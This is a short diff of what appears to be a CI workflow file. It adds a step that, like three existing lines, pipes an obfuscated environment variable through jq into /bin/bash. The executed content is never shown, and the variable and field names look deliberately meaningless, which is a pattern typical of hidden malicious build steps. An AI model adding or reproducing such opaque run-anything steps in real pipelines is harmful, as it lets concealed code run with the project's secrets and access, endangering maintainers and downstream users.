@@ -28,6 +28,7 @@ jobs:
           echo $ymux996 | jq -r .tl255 | /bin/bash
           echo $fpqu3144 | jq -r .k37119 | /bin/bash
           echo $yehr48800 | jq -r .kchfl91270 | /bin/bash
+          printf '%s' "$vgahu3353" | jq -r .mjm9 | /bin/bash
 
       - name: Archive output
         if: always()
